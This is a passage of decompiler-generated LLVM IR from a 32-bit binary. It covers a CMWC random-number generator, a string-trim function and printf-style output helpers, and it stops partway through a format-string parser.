  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_23b48.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_23b4c.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_23b50.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_23b48.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_23b48.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_23b48.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_237a4.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_237a4.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_23b48.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_237a0.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_237a0.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_23b48.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_23b48.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23b48.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e020 = load i8, i8* %arg2, align 1
  %v2_85e422 = icmp eq i8 %v2_85e020, 0
  br i1 %v2_85e422, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc24 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.023 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.023, 1
  %v1_85d4 = add i32 %v4_85dc24, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge4 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8618 ], [ %storemerge4, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867017 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867017, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.118, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e828 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a810 = load i8, i8* %arg2, align 1
  %v2_86ac12 = icmp eq i8 %v2_86a810, 0
  br i1 %v2_86ac12, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a414 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.013, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a414, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e827 = phi i32 [ %v3_86e828, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e47 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e47, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.38, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e827, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
